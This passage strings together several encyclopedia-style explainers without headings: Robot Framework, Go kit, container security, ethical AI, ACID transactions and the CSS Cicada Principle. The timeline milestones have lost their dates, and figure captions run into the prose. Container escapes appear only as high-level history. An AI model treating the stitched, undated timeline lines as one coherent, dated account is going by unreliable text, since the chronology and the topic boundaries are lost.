We list a few of them : Conditionals : Keyword Should Exist , Length Should Be , Should Be Empty , Should Be Equal , Should Contain , Variable Should Exist Control Flow : Continue For Loop , Exit For Loop , Repeat Keyword , Return From Keyword Conversions : Convert to Binary , Convert to Boolean , Convert to Bytes , Convert to Integer Executions : Call Method , Evaluate , No Operation , Run Keyword Library : Get Library Instance , Import Library , Reload Library , Set Library Search Order Logging : Log , Log Many , Log To Console , Log Variables , Set Log Level , Set Test Message String Operations : Catenate , Should End With , Should Match , Should Match Regexp , Should Not Be Equal As Strings Timing : Get Time , Run Keyword If Timeout Occurred , Sleep , Wait Until Keyword Succeeds Variables : Get Variable Value , Import Variables , Set Global Variable , Set Suite Variable , Set Test Variable Verdict : Fail , Fatal Error , Pass Execution , Pass Execution If Where does Robot Framework fit within a test automation architecture ?
Architecture of Robot Framework .
Source : QATestLab 2017 , pg .
14 .
The job of the framework is to read and process data , execute test cases , and generate reports and logs .
The core of the framework does n't know anything about the system under test ( SUT ) .
Actual interaction with SUT is handled by various libraries .
Libraries themselves rely on application interfaces or low - level test tools to interact with SUT .
Let 's take the example of testing a web application .
Suppose Selenium is used for testing the application .
The Robot Framework does n't directly control interactions with the web browser or databases .
SeleniumLibrary and DatabaseLibrary are two libraries that manage these interactions .
These libraries expose relevant keywords that can be used in test cases without worrying about how they are implemented .
Could you share some best practices when writing tests in Robot Framework ?
Test cases should be easy to understand .
Use descriptive names for test suites and test cases .
Likewise , keyword names should be clear and descriptive .
A common convention is to use the title case for keywords .
For example , use ` Input Text ` rather than ` Input text ` .
For variables , use lowercase for local scope and uppercase for global scope .
Document each test suite .
Describe the purpose of tests in that suite and the execution environment .
Include links to external documents .
At test case level , documentation may not be required .
The use of suitable tags is often more useful .
Tests within a suite should be related .
Do n't have too many tests in a single file , unless they are data driven .
Each test should be independent of others and should rely only on setup and teardown .
Each test case should test something specific .
A large test could possibly cover an end - to - end scenario .
If there are user - defined keywords , document the arguments and return values .
Between keywords , assign return values to variables , and then pass these variables as arguments .
Avoid sleep .
Instead , wait for an event with a timeout .
What are some useful resources and tools for Robot Framework ?
The official Robot Framework website is a good starting point .
Those new to writing tests can study the examples there .
The User Guide is another useful resource .
Beginners should get familiar with some of the standard libraries , including Builtin , OperatingSystem , String , Process , DateTime , Collections , Screenshot , and more .
The framework has been extended by many third - party libraries .
Choose what suits your application .
There are libraries to interface or work with Android , Eclipse , databases , Selenium , Django , SSH , FTP , HTTP , MQTT , and more .
Among the useful tools are Rebot for generating logs and reports ; Tidy for cleaning or formatting test data files ; Libdoc and Testdoc for documentation .
Pabot is a tool for parallel execution .
The Robot Corder can record and playback browser test automation .
You can choose among various editors and build tools .
There 's also a Jupyter kernel .
At the Helsinki University of Technology , Paul Laukkanen / Klärck started looking into large - scale test automation frameworks .
As part of his Master 's thesis ( published in 2006 ) , he created a keyword - driven prototype framework .
Nokia Networks is on the lookout for a generic test automation framework .
The Robot Framework was born based on Klärck 's work .
Nokia Networks open sources Robot Framework with the release of version 2.0 .
RIDE screenshot showing the use of keywords and their arguments in a test case .
Source : Goralight 2016 .
Version 1.0 of Robot Framework IDE ( RIDE ) has been released on GitHub .
RIDE simplifies the writing and execution of automated tests .
Earlier version v0.40 , also available on GitHub , can be traced to January 2012 .
Code before this was hosted at Google Code .
Robot Framework 3.0 has been released .
With this release , Python 3 is supported .
Standard ISO / IEC / IEEE 29119 - 5:2016 , Part 5 : Keyword - driven testing is published .
This underscores the growing importance of keyword - driven testing .
Called RoboCon , the first annual Robot Framework Conference is organized in Helsinki , Finland .
Robot Framework 3.1 has been released .
With this release , Robotic Process Automation ( RPA ) is supported .
This means that the framework can be invoked to automate tasks and not just tests .
Go kit logo .
Source : Go kit 2019a .
Building an app based on microservice architecture is not trivial .
We would need to implement many specialized parts such as RPC safety , system observability , infrastructure integration , program design , and more .
Go language 's standard library itself is n't adequate to implement these easily .
This is where the Go kit becomes useful .
Using Go kit means that developers can focus on their application rather than grapple with the challenges of building a distributed system .
Go kit is positioned as a toolkit for microservices .
It 's not a framework .
It does n't force developers to use everything it provides .
It 's also lightly opinionated about what components or architecture that developers should use .
Go kit is really a library .
Developers can only choose what they want .
Go kit is open source and follows the MIT License .
What 's the relevance of Go kit in the context of microservices ?
Requirements or features of a microservice architecture .
Source : Bourgon 2015 , 15:30 .
When an app is composed of dozens or even hundreds of microservices , there 's a lot more to be done than just defining and building those services .
We need consistent logging across services .
Metrics have to be collected both at the infrastructure layer and at the application layer .
When a request comes in , we may need to trace how this request moves across multiple services .
For robustness , we need rate limiting and circuit breaking .
Each service will likely be run in multiple instances that are dynamically created and destroyed .
Service discovery and load balancing are therefore essential .
While Go has a much lower resource footprint compared to Ruby , Scala , Clojure or Node , back in 2014 , it did n't have anything for a microservice architecture .
Go kit 's inventor , Peter Bourgon at SoundCloud , found that teams were choosing Scala and JVM because of better support for " microservice plumbing " .
In fact , SoundCloud adopted Twitter 's Finagle .
Go did n't have an equivalent to this .
Thus was born the idea of Go kit .
It 's really , a set of standards , best practices , and usable components for doing microservices in Go . Which are the key components of the Go kit ?
The transport layer does the encoding and decoding .
Source : Bourgon 2017 , slide 78 .
Go kit microservices have three layers : Transport , Endpoint , Service .
Requests come in at the transport layer , move through the endpoint layer and arrive at the service layer .
Responses take the reverse route .
Go kit supports a number of transport .
Thus , legacy transport and modern transport can be supported within the same service .
Some supported transport include NATS , gRPC , Thrift , HTTP , AMQP and AWS Lambda .
The primary messaging in Go kit is RPC .
An endpoint is an RPC method that maps to a service method .
A single endpoint can be exposed via multiple transport .
The service layer is where all the business logic resides .
This is the concern of application developers who need not know anything about endpoints or transport , which are taken care of by Go kit .
A service is modelled on an interface and its implementation contains business logic .
Due to this separation of concerns , Go kit encourages you to adopt SOLID design principles and clean architecture .
In fact , Go kit can be used to build elegant monoliths as well .
What 's the concept of middleware in Go kit ?
Separation of concerns in Go kit .
Source : Bourgon 2017 , slide 51 .
Go kit takes the idea of " separation of concerns " further with the use of middleware .
Rather than bloating core implementations with lots of functionality , additional functionality is provided through middleware using the decorator pattern .
Go kit provides middleware for the endpoint layer , while application developers can write middleware for the service layer .
We can also chain multiple middleware .
Here 's a sample of the middleware : Endpoint : Load balancing , safety , operational metrics , circuit breaking , rate limiting .
Service : Includes anything that needs knowledge of business domain , including app - level logging , analytics , and instrumentation .
As can be expected of the decorator pattern , an endpoint middleware accepts an endpoint and returns an endpoint .
A service middleware accepts a service and returns the service .
Go kit does n't force you to use all the middleware that comes with it .
For example , if you 're using Istio that already comes with circuit breaking and rate limiting , then you ignore their equivalent Go kit middleware .
Which are the packages available in Go kit ?
Without being exhaustive , here are some Go kit packages : Authentication : Basic , casbin , JWT .
Circuit Breakers : Hystrix , GoBreaker , and HandyBreaker .
Logging : Provide an interface for structured logging .
Recognizes that logs are data .
They need context and semantics to be useful for analysis .
Supported formats are logfmt and JSON .
Metrics : Provides uniform interfaces for service instrumentation .
It comes with counters , gauges , and histograms .
It has adapters for CloudWatch , Prometheus , Graphite , DogStatsD , StatsD , expvar , and more .
Rate Limit : Uses Go 's token bucket implementation .
Service Discovery : Consul , DNS SRV , etcd , Eureka , ZooKeeper , and more .
Tracing : OpenCensus , OpenTracing , and Zipkin .
Transport : AMQP , AWS Lambda , gRPC , HTTP , NATS , Thrift .
Could you share some best practices for using Go kit ?
Do n't change your platform or infrastructure to suit Go kit .
Remember that Go kit is only lightly opinionated .
It will integrate well with whatever platform or infrastructure you 're already using .
Go kit adopts domain - driven design and declarative composition .
It uses interfaces as contracts .
You should , too , when implementing your services .
Each middleware should have a single responsibility .
Other frameworks might use dependency injection .
In Go kit , the preferred approach is to wire up the entire component graph in ` func main ` .
This forces you to pass them explicitly to components via constructors .
Avoid using global state .
Errors can be encoded in two ways : as an error field in response struct , or an error return value .
For services , I prefer the former method .
For endpoints , I prefer the latter since these are recognized by middleware such as circuit breaker .
Individual services should not collect or aggregate logs .
This is the job of the platform .
Your services should write to stdout / stderr .
Access to databases will likely be in a service implementation .
Better still , use an interface to model persistence operations while an implementation wraps the database handle .
What are some criticisms or limitations of Go kit ?
It 's been said that Go kit is too verbose .
Adding an API to a microservice involves a lot of boilerplate code .
While Go kit nicely separates the business logic , endpoint and transport layers , this abstraction comes at a cost .
The code is harder to understand .
However , developers who do n't wish to write boilerplate code can make use of code generators .
Two generators are kitgen and Kujtim Hoxha 's GoKit CLI .
Inspired by Go kit , the engineering team at Grab created Grab - Kit .
They felt that Go kit still requires a lot of manual work , something Grab - Kit aims to solve .
The idea is to codify best practices .
Grab - Kit standardizes APIs , SDKs , error handling , etc .
It uses a consistent middleware stack across services including automatic profiling and execution traces .
Peter Bourgon , while working at SoundCloud , makes the first commit to the Go kit code .
However , the codebase is not versioned at this point .
The first tagged version v0.1.0 happened only in June 2016 .
Go kit 's popularity is based on GitHub stars .
Source : Ryan 2018 .
Based on GitHub stars , Go kit is seen as the most popular toolkit , followed by Micro , Gizmo and Kite .
Version 0.7.0 has been released .
This includes kitgen code generator , JSON - RPC transport , and ETCDV3 support in service discovery .
Version 0.8.0 has been released .
This includes NATS and AMPQ transport .
Version 0.9.0 has been released .
This supports AWS Lambda as transport .
Comparing container security features of three platforms .
Source : Grattafiori 2016 , sec .
9.13 .
With the wide adoption of container - based applications , systems have become more complex and security risks have increased .
This laid the groundwork for container security .
Vulnerabilities like dirty copy - on - write only furthered this thinking .
This led to a shift left in security along the software development lifecycle , making it a key part of each stage in container app development , also known as DevSecOps .
The goal is to build secure containers from the ground up without reducing time to market .
DevOps practice has enabled faster release cycles .
At runtime , an application may dynamically scale to hundreds or even thousands of containers .
It 's impossible to have manual policies to secure these containers .
Moreover , a production environment involves many layers , such as images , registries , orchestrators and container runtimes .
Hence , traditional security practices ca n't be directly applied to securing containers .
Which are the basic security mechanisms that come with containers ?
Usage of Linux kernel capabilities by container platforms .
Source : Ali Babar and Ramsey 2017 , table 5 .
In terms of filesystems , networking and processes , containers are isolated from one another using namespaces .
To control access to resources such as CPU and RAM , there are cgroups .
To control kernel calls from a container , we use Linux kernel features called capabilities and seccomp .
Capabilities provide fine - grained access control such as denying " mount " operations or access to raw sockets .
Even if someone gains root access within a container , the damage they can do is limited .
Secure computing mode ( seccomp ) disables access to system calls except those allowed .
Both these adopt a whitelist approach .
Red Hat distributions come with SELinux while Debian distributions come with AppArmor .
Both these are security modules that provide access control by implementing Mandatory Access Control ( MAC ) .
Only users and processes with sufficient permission can perform various actions .
The access policies ca n't be changed by users .
We can also run the kernel with GRSEC and PAX to provide extra compile - time and runtime safety checks .
Is it okay to run my process with root access within the container ?
Some processes running on typical servers run with root privileges .
Examples are SSH daemon , cron daemon , logging daemons , kernel modules , and network configuration tools .
It may therefore appear that these processes need to run with root privileges inside a container .
In reality , such tasks are handled by the infrastructure surrounding the container , such as the host machine or the container platform .
Even when a specific process needs root privilege , limit access using capabilities .
In general , stick to the principle of least privilege .
Do n't give more permission than needed .
One way to implement this is to use known user ID and group ID that have the minimum required privileges .
An alternative available in Docker is to use a command - line option ; example , ` docker run --user 1001 ... ` , which avoids root access .
Most processes inside containers are app services and should not require root access .
Docker itself requires root access but not the containers .
What are the various security threats facing containers ?
Threats and attack the surfaces of containers .
Source : HyTrust 2019 .
NIST has identified key threats to containers : Image : An image may lack security updates or become outdated , particularly when security bugs have been discovered after the image was created .
The image may contain a misconfiguration , such as running a command with a greater privilege than needed .
Image may include malware , particularly when a base layer comes from a third party or untrusted source .
Secrets such as SSH private keys may be in the image as clear texts .
Registry : Images stored at registries may be stale .
Registries themselves can be compromised .
Pulling images over insecure connections is also an issue .
Orchestrator : If access privileges are not properly scoped , users can access and affect containers that do n't belong to them .
Wrong configurations may allow unauthorized nodes to join a cluster .
Container : At runtime , malicious software can affect other containers or the host OS .
App vulnerabilities can affect the container .
Unplanned or unsanctioned containers , especially in a development environment , are a risk .
Host : The host itself has an attack surface .
Because the kernel is shared , runtime isolation is not as high as that of hypervisors .
What are some best practices for secure containers ?
Automate image scans and runtime audits .
Source : Mouat 2016 .
We list some industry best practices for secure containers : Called image provenance , have a system such as Docker Content Trust to identify the source of an image that 's running in production .
Containers must run with minimum resources and privileges .
Use AppArmor or SELinux to enforce access control .
Perhaps the most important advice is to not use root privilege to run the container 's main process .
At runtime , they detect threats and respond to the same automatically .
Vulnerability scanning , regular auditing , and software updates must be automated .
Since containers are not permanent , traditional operational models may not work .
Organizations may have to formalize new models .
Use Docker Bench for Security to know if you 're following best practices around container deployment .
Minimize the use of third - party images and use only signed images .
Mount the host filesystem as read - only or disable UNIX sockets , thus limiting access to an attacker .
Is n't it better to use VMs instead of containers for better security ?
Kata brings the security of VMs to contianers .
Source : Fulton III 2017 .
Containers offer only software - based isolation using namespaces and cgroups .
Multiple containers share the same kernel .
If one container is compromised , the attacker can potentially gain access to other containers on the host .
This is where the hypervisor layer of VMs provides hardware - enforced isolation .
But it 's possible to mix both VMs and containers .
By running multiple containers inside a VM , we get the performance of containers without sacrificing the security of the hypervisor .
It 's common among cloud providers to isolate tenants using VMs .
For greater security , we can use VMs to separate containers that need to run at different security levels .
For example , a billing service may run at a higher security level compared to a user - facing web service .
Joyent and IBM isolate tenants by running containers on bare metal without using VMs .
Hyper , Intel and VMware are building fast VM - based frameworks with the aim of getting the best of both worlds .
The idea is to secure a container without the bloat of a VM .
These are called Kata Containers .
It uses the runV container runtime .
Which tools can help me secure my containers ?
Tips for selecting the right tool for container security .
Source : Prevent Breach 2018 .
While container platforms and containers themselves offer a basic level of security , this is n't enough .
There 's a need to scan container images or monitor a running container .
There are many vendors offering products that do this .
Some of them are Alert Logic , Anchore , Aporeto , Aqua Security , Capsule8 , NeuVector , Qualys , StackRox , Sysdig , and Twistlock .
Any good tool should have visibility of containers , images and host processes .
It should validate container signatures .
It should alert you when there are image drifts .
It should monitor slaves and masters of Swarm or Kubernetes clusters .
Tools should have an easy - to - use dashboard .
It should make use of image metadata to enable filtering by labels and tags .
It should classify threats by severity and priority .
Select a tool that integrates well with your CI / CD pipeline .
Google 's Container Registry vulnerability scanning , Red Hat 's Atomic Scan , IBM 's Bluemix Vulnerability Advisor , CoreOS Clair , Docker Security Scanning , Aqua Security 's Peekr , and Twistlock Trust can do security scanning .
Runtime threat detection and response are offered by Aqua Security , Joyent Triton SmartOS , Twistlock and Red Hat OpenShift .
Docker Content Trust ( DCT ) is released as a new feature in Docker Engine 1.8 .
This adds a digital signature to an image before it 's pushed to the registry .
When images are pulled , the signatures are verified .
Through the implementation of The Update Framework ( TUF ) , rollback attacks and freeze attacks are also prevented .
By using a vulnerability in the Linux kernel , called Dirty Copy - on - Write or CVE-2016 - 5195 , one researcher creates an exploit that achieves container escape , essentially allowing the attacker to do things outside the container .
The exploit uses Linux 's virtual Dynamic Shared Object ( vDSO ) .
Container image scanning within the CI / CD pipeline .
Source : Kaul and Oviedo 2018 .
Google launches beta version of Container Registry vulnerability scanning .
This helps within the CI / CD pipeline and prevents deployment of images that have vulnerabilities .
Two researchers discover a way to escape from a container into the host system and obtain root privileges .
This is possible with a compromised container even if it 's using the default or hardened configuration .
The exploit overwrites ` docker - runc ` binary on the host with malicious software .
This bug in runc , called CVE-2019 - 5736 , affects Docker and other container platforms .
A patch will be released in February .
Guiding principles for ethical AI .
Source : Kumar 2018 .
We 're living in a world where machines and algorithms are increasingly giving recommendations , tagging content , generating reviews and even taking decisions .
A number of ethical questions arise .
Can we trust machines to do the right thing ?
Was my loan application processed in a fair manner ?
Why was my application rejected ?
Then there are questions about AI replacing humans in the workplace .
With the widespread use of personal data , we 're worried about privacy and data theft .
What happens to us if AI agents acquire human - like cognitive abilities ?
Ethical AI addresses these issues by building systems that are safe , fair , transparent , accountable and auditable .
To practice ethical AI , it 's been said that we are not at the point where you can simply download a tool to do the job .
Data ethics is still new and it requires critical thinking .
Are there real - world examples that highlight the need for ethical AI ?
In March 2016 , Microsoft released a chatbot named Tay .
Tay could interact and learn from real users on social platforms .
Soon , Tay was exposed to nasty tweets and ended up becoming mean and racist on her own .
A study by ProPublica found that software used to predict future criminals is biased against blacks .
Risk scoring done by the software is seen by judges and directly influences sentences .
White defendants were often mislabelled as low risk compared to black defendants .
Only 20 % of those predicted to commit violent crimes went on to do so .
In March 2018 , an Uber self - driving vehicle killed a pedestrian .
Who is responsible : the distracted driver , the pedestrian , Uber , developers who wrote the code , or a sensor manufacturer ?
It 's unrealistic to expect AI systems to be perfect , but determining liability is n't trivial .
More recently , it was found that Facebook 's ad delivery algorithms discriminate based on race and gender even when ads are targeted to a broad audience .
Influencing factors include user profile , past behaviour and even the ad content .
What are the common ethical concerns raised by AI ?
Ethical AI has the following concerns : Bias : AI systems can be biased because they 're designed to look for patterns in data and favour those patterns .
Liability : AI systems ca n't be perfect .
When mistakes are made , who 's responsible ?
Security : As AI systems advance , how do we stop bad actors from weaponizing them ?
What happens if robots can fight and drones can attack ?
Human Interaction : There 's already a decline in person - to - person interactions .
Are we sacrificing humanity 's social aspects ?
Employment : Repetitive , predictable jobs that can be automated will be automated .
Those replaced have to retrain themselves in areas where robots ca n't come in easily , such as creative or critical thinking .
Wealth Inequality : Companies rich enough to invest in AI will get richer by reducing costs and being more efficient .
Power & Control : Big companies that use AI can control and manipulate how society thinks and acts .
Robot Rights : If AI systems develop consciousness and emotions , should we give them rights ?
Can we punish AIs and make them suffer ?
Singularity : What happens if AI surpasses human intelligence ?
Will they turn against us to defend themselves ?
How can AI be biased when it 's based on trusted data ?
Bias in AI systems .
Source : Google 2017 .
Even if data is trusted , it may not be a fair representation of the population .
Dataset may be skewed in a number of ways , including race , gender , education , or wealth .
When algorithms are exposed to this data , they acquire the bias that 's present in them .
Bias in AI comes from human biases since we are the ones building the algorithms and creating / selecting data .
Minorities , often in low - income groups , lack access to technology .
As a result , AI systems are not trained on such data .
One infamous example is Google tagging a photo of a black woman as " gorilla " .
There are many ways in which human biases creep into AI systems .
Selection bias , interaction bias and latent bias are some examples .
An AI system that 's trained primarily on American or European faces will not work well when applied on Asian or African faces .
In one example , a Nikon S630 camera hinted to the user that perhaps she had blinked when , in reality , Chinese people have eyes that are squinty when they smile .
In another example , a happy tribal woman was wrongly classified as having a " disgusted " emotion .
What can we do to make AI more ethical ?
AI ethics by design .
Source : Atos 2019 .
We need to design our systems to avoid biases .
Check that proxy metrics do n't introduce bias .
We can minimize bias by having diversity in teams , data , and validation .
For transparency , data must be marked with metadata detailing the source , intended use , usage rights , etc .
Data must be managed well , leading to algorithms that are better traceable , reproducible and fixable .
Context is key to transparency and explainability .
When AI systems fail , they have a plan to fix them in production .
We need to monitor them .
Let the purpose be clearly defined and bounded .
AI systems should not be allowed to explore unintended pathways .
What we need is a holistic approach .
It 's not just about technology and tools , but also about leadership , standards and rules .
Microsoft 's Satya Nadella has said ethical AI also means how humans interact with AI .
We must have empathy , education , creativity , judgement and accountability .
Accenture has suggested setting up AI advisory bodies .
Have discussions .
Publish guidelines .
Engage with stakeholders .
The AI Ethics Lab is looking into integrating ethics and AI right in the R&D phase .
Are there published guidelines or code of conduct for practising ethical AI ?
The Institute for Ethical AI & ML has identified 8 ML principles for responsible AI : human augmentation , bias evaluation , explainability by justification , reproducible operations , displacement strategy , practical accuracy , trust by privacy , and security risks .
They also identify a 4-phase strategy : by principle , by process , by standards , by regulation .
They 've also formed the Ethical ML Network .
The Future of Life Institute has created an interactive map addressing validation , security , control , foundations , verification , ethics and governance .
In 2018 , GE Healthcare published a set of AI principles .
Google published its own guidelines of what AI applications should and should n't do .
Microsoft released ten guidelines for developing conversational AI .
One of these guidelines says that developers are accountable until bots become truly autonomous .
Amazon has started using AI for filtering resumes and hiring top talent .
But in 2015 , it was discovered that the algorithm is biased towards male candidates since it was trained on resumes submitted to Amazon over a 10-year period .
This dataset had mostly male applicants since they dominated the tech industry .
The algorithm just reinforced the bias .
The algorithm was found to have other problems as well and was discontinued by Amazon .
interest in ethical AI started in 2016 .
Source : CB Insights 2018 .
This is the year when people start talking about ethics and AI .
Interest in ethical AI will grow through 2017 and 2018 .
Microsoft appointed Tim O'Brien to the role of AI Ethicist , a new full - time position .
The role involves AI ethics advocacy and evangelism .
In reality , O'Brien clarifies that the role includes IoT , analytics , and AR / VR , since real - world solutions are hybrids of multiple technologies .
Maria de Kleijn - Lloyd of Elsevier finds from her research that only 0.4 % of published work on AI deals with ethics .
She comments that there 's a lot of discourse on ethical AI but not much in terms of research and rigorous inquiry .
Google disbanded the Advanced Technology External Advisory Council ( ATEAC ) , which was supposed to advise on ethical AI .
This happens due to controversy over ATEAC membership .
This example shows that avoiding human bias and discrimination is not easy .
Mapping different AI principles to eight themes .
Source : Fjeld et al .
2020 , pp .
8 - 9 .
Fjeld et al .
note that many organizations working with AI have published their own guidelines .
They studied thirty - six such documents and identified eight main themes .
Moreover , recent documents tend to cover all the eight themes .
Computer systems are rarely perfect and this applies to databases as well .
To ensure that data is updated in a consistent manner , a sequence of operations are often grouped together into what 's called a transaction .
We may say that a transaction is something that changes the system state .
If something goes wrong when executing these operations , the transaction as a whole can be aborted .
This means that the database can be safely rolled back to the consistent state before the transaction .
In database design and implementation , a transaction must fulfil four essential properties : Atomicity , Consistency , Isolation , Durability ( ACID ) .
Monolithic or SQL databases adopted ACID in their transactions but distributed or NoSQL databases did n't .
However , distributed databases are starting to support ACID without impacting performance .
What 's the meaning of the acronym ACID ?
ACID transactions .
Source : Yaseen 2019 .
ACID can be explained as follows : Atomicity : All operations of a transaction happen as if they 're a single operation .
All changes are performed or none at all .
If one operation in a transaction fails , the entire transaction fails and completed operations are rolled back .
Consistency : Data starts in a consistent state and ends up in a consistent state .
During the transaction , it may be inconsistent , but in the end , data is left in a consistent state .
Isolation : The Intermediate state of a transaction is not visible to other concurrent transactions .
Concurrent transactions are effectively serialized .
Durability : When a transaction is completed , changes are stored in a persistent manner .
Even if there 's a power failure or other system errors , the effect of the completed transaction remains .
Could you explain ACID with an example ?
A transaction showing debit and credit .
Source : Steffensen 2009 , slide 36 .
Consider a money transfer transaction .
At a minimum , it would involve two operations : debiting from one account , then crediting to another account .
What happens if money is debited from an account , then some failure happens ( disk crash or power outage ) , and the receiver 's account is never credited ?
This scenario leaves the database in an inconsistent state .
To guard against this , we wrap both these operations into a single transaction that 's expected to have ACID properties .
So now , even if there 's a failure , atomicity ensures that the transaction will rollback the debit operation .
In a normal successful scenario , both accounts will be updated correctly .
It 's not an issue if there 's a failure after the transaction , since accounts have been updated in some persistent storage .
Suppose another transaction T2 queries the database when the money transfer transaction T1 is in progress .
It will see the original balance in the sender 's account since T1 has n't completed , even when the debit operation has happened within T1 .
This is the concept of isolation .
How do databases meet the ACID requirements ?
Transaction states and their transitions .
Source : TutorialsPoint 2019 .
A transaction moves through various states .
In the end , it can either succeed ( committed ) or fail ( aborted ) .
When committed , all changes made by the transaction become persistent .
When aborted , changes made by the transaction are rolled back so that the starting state of the database is returned .
This is usually implemented by making changes in a temporary space and then committing the entire transaction as a final step .
Consistency is ensured by having a strongly consistent core involving a single operation in a single row .
Integrity checks are built on top of this for multiple operations across multiple rows .
For instance , read - write locking and multiversion concurrency control are two approaches .
We also use globally ordered timestamps so that transactions can be organized serially .
Partial ordering is possible when sub - transactions belonging to multiple transactions interleave .
This lowers latency but does n't give full isolation .
Instead , a mechanism to detect writing conflicts is used .
What are the problems when isolation is not proper ?
Isolation levels in SQL standard .
Source : Mihalcea 2014 .
Dirty reading happens when full isolation is not present across transactions .
A transaction updates a value but it 's not yet committed .
Another transaction reads the uncommitted value but the original transaction rolls back the changes due to an error .
What happens if consecutive reads give different values ?
This problem is called non - repeatable reading .
This can be solved by locking the record until the current writing transaction is completed .
Another problem is phantom reading that happens when a new record is inserted , and this record matches the selection criterion issued by another concurrent transaction .
The reading transaction will end up using stale data .
Range locking or predicate locking is the solution to this problem .
Are there scenarios where we can relax ACID requirements ?
Modern databases offer distributed ACID .
Source : Choudhury 2018b .
Database operations are either write - intensive transactional ( OLTP ) or read - intensive analytical ( OLAP ) .
ACID is essential for OLTP but can be relaxed for OLAP .
Likewise , ACID has been traditionally relaxed in NoSQL or distributed databases where the focus has been on scale and availability .
Strong consistency is sacrificed for eventual consistency .
This is because in a distributed database it 's inefficient globally to acquire and release locks .
However , modern databases of the late 2010s are bringing back ACID even in a globally distributed environment .
Examples include Google Cloud Spanner , CockroachDB , TiDB , YugaByte DB , FoundationDB and FaunaDB .
The point is that where ACID is not guaranteed by the database , developers should take of consistency and isolation in the application logic .
This may end up being more expensive in terms of development effort .
ACID may be essential in the banking and finance industry , but not every application requires ACID .
Developers should evaluate if eventual consistency or " ACID in practice " is adequate for their application .
What do you mean by Distributed ACID ?
The simplest transation in a distributed database is single row ACID where a transaction impacts only one row .
Single shard ACID is where the transaction impacts multiple records but they 're all on the same shard , which is present on a single node .
A true Distributed ACID is when the transaction impacts records across shards and nodes .
Achieving distributed ACID is not trivial .
A transaction manager that uses Two - Phase Commit ( 2PC ) protocol can be used for atomicity .
Paxos or Raft consensus protocols can be used for consistency .
To synchronize times for isolation , the Network Time Protocol ( NTP ) can be used .
Not all distributed databases support distributed ACID .
For example , since version 4.0 , MongoDB supports single shard ACID but not distributed ACID .
Consider Amazon Aurora , Amazon DynamoDB or Azure Cosmos DB .
These have mutiple masters with data replication .
These are not compliant with distributed ACID .
Each master has the entire data .
Write conflicts are resolved using Last - Write - Wins ( LWW ) or Conflict - Free Replicated Data Types ( CRDT ) .
Simple linear transactions vs. parallel and nested transactions .
Source : Gray 1981 , fig .
1 .
Jim Gray at Tandem Computers defines a transaction and notes that it must have three properties : consistency , atomicity and durability .
At this point , neither isolation as a property nor ACID as an acronym is mentioned .
He explains how the transaction concept can be implemented as time - domain addressing or logging plus locking .
Tandem itself implemented these ideas in its NonStop approach , thus making their systems highly fault - tolerant .
Based on Gray 's concept of a transaction , Theo Haerder and Andreas Reuter identify isolation property .
They also coin the term ACID .
They state that " transaction is the only unit of recovery in a database system " .
The Evolution of transaction management since ACID .
Source : Wang et al .
2008 , fig .
1 .
From the mid-1980s , as business applications got more complex , new transaction models appeared : nested transactions , chained transactions , distributed transactions .
Based on application semantics , a transaction is divided into sub - transactions .
The concept of save points ( invented in the 1970s ) has become useful to rollback to specific sub - transactions .
However , ACID guarantees are only at the transaction level .
Thus , ACID requirements are relaxed for these complex applications .
With the growth of NoSQL and distributed databases since the early 2000s , the CAP Theorem has become the blueprint for designing a database system .
Likewise , database system designers prefer to adopt BASE ( Basic Availability , Soft - state , Eventual Consistency ) .
In short , scale , resilience and availability are considered more important than immediate consistency .
Google published a paper on Spanner , a globally - distributed database that gives high performance without sacrificing strong consistency .
It 's only in May 2017 that it became production ready under the name of Cloud Spanner .
Likewise , researchers at Yale University published details of Calvin for distributed transactions on partitioned database systems .
These are a couple of examples showing the trend towards distributed ACID from the mid-2010s .
Periodical cicadas are insects of North America that mature into adulthood and emerge every 13 or 17 years .
They come out together in their billions , thus making it difficult for predators to eat them all .
What 's interesting is their periods are prime numbers .
This means that predators ca n't easily synchronize their own periods to that of the periodical cicadas .
Another theory is that prime numbers prevent the emergence of hybrids from cicadas with different periods .
Inspired by this natural phenomenon , now called the Cicada Principle , web front designers have sought to use prime numbers to produce variations and patterns in their designs in a more efficient manner .
Often , CSS containing prime numbers are used to achieve this .
Could you illustrate how prime numbers are useful in frontend design ?
Illustrating the Cicada Principle .
Source : Devopedia 2021 .
Let 's take two prime numbers , 3 and 5 .
If we shade two rows based on these primes , we 'll find that the shading will not fall on the same column until the 15th column .
This is because 3 and 5 do n't have any common factors other than 1 .
In fact , for this to happen , it 's sufficient that the numbers are co - primes .
In the case of the periodical cicadas , the periods are 13 and 17 .
This means that it 's only once in 13x17 = 221 years that the two different species will come out in the same year .
Frontend designers who wish to create pseudorandom elements in their design need not actually generate random numbers or hardcode many variations .
The use of large prime numbers will give them sufficient variations because patterns can be discerned only on a larger scale based on the multiples of those prime numbers .
Where and how can I apply the Cicada Principle in CSS ?
The stacking order model .
Source : Walker 2011 .
Backgrounds can be created without having any repeating patterns in them or showing gaps or seams between tiles .
We can tile and overlap images of different widths , these widths having prime - numbered pixels .
More efficiently , we can implement the same using CSS gradients .
Michael Arestad has created interesting backgrounds by using prime numbers for background sizes and positions .
In general , Alex Walker proposed a " stacking order model " , where many layers are stacked to create a background .
The bottom layer can be small and repetitive since much of it will be obscured by higher layers .
The topmost layer should have the largest dimension and also be thinly scattered ( largest prime amount in the group ) .
It should also preferably not have eye - catching details .
Element borders , including border radius , can be varied so that each element of a group gets a different border .
These borders can also be animated for a mouse hover event .
We can use the principle for CSS animations too by having the durations as prime numbers , scaled if necessary by a suitable factor .
Could you illustrate an example of creating a CSS background based on the Cicada Principle ?
Illustrating CSS background creation using the Cicada Principle .
Source : Adapted from Storey 2014 .
Let 's create a background by applying the Cicada Principle to the ` background - size ` .
By setting the sizes to either 17px or 37px and then applying ` linear - gradient ` we get a repetitive pattern , which is not very interesting .
When we combine both 17px and 37px widths , we obtain a more interesting background .
However , this still shows some visual tiling .
By adding another layer of width 53px , which is also a prime number , we get a background that 's closer to what we want .
To create the gradients in the first place , we need to adjust the alpha values .
Here too , we can make use of prime numbers , with each layer getting a different alpha value for creating the gradients .
Pseudorandom background from just three images .
Source : Walker 2011 .
Alex Walker reads about periodical cicadas and gets the idea to use prime numbers for generating pseudorandom background patterns .
He uses three images of different prime - numbered widths : 29 , 37 and 53 pixels .
When these three are overlapped and tiled , the resulting background will not repeat for 29x37x53 = 56,869 pixels .
The three images together take up less than 7kB in size .
Eric Meyer uses CSS gradients for implementing the Cicada Principle for backgrounds .
Compared to background images , this reduces requests to server and saves download bandwidth .
He calls these gradients Cicadients .
Lea Verou produces CSS animations using the Cicada Principle .
Charlotte Jackson used the Cicada Principle to create pseudorandom borders around images .
